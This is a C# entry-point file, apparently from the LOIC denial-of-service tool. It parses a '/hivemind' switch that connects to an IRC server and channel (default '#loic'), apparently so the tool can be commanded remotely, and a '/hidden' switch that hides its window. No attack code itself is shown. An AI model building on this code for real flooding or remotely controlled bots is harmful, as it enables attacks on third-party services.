using System;
using System.Windows.Forms;
using System.Text;

namespace LOIC
{
	static class Program
	{
		[STAThread]
		static void Main(string[] cmdLine)
		{
			bool hive = false;
			bool hide = false;
			/* IRC */
			string ircserver = "";
			string ircport = "";
			string ircchannel = "";
			/* Lets try this! */
			int count = 0;
			foreach (string s in cmdLine)
			{
				/* IRC */
				if (s.ToLower() == "/hivemind")
				{
					hive = true;
					ircserver = cmdLine[count + 1]; //if no server entered let it crash
					try {ircport = cmdLine[count + 2];}
					catch (Exception) {ircport = "6667";} //default
					try {ircchannel = cmdLine[count + 3];}
					catch (Exception) {ircchannel = "#loic";} //default
				}
				/* Lets try this! */
				if (s.ToLower() == "/hidden") {hide = true;}
				count++;
			}
			//Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new frmMain(hive, hide, ircserver, ircport, ircchannel));
		}
	}
    public partial class Functions
    {
		public string RandomString()
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < 6; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
		}
	}
}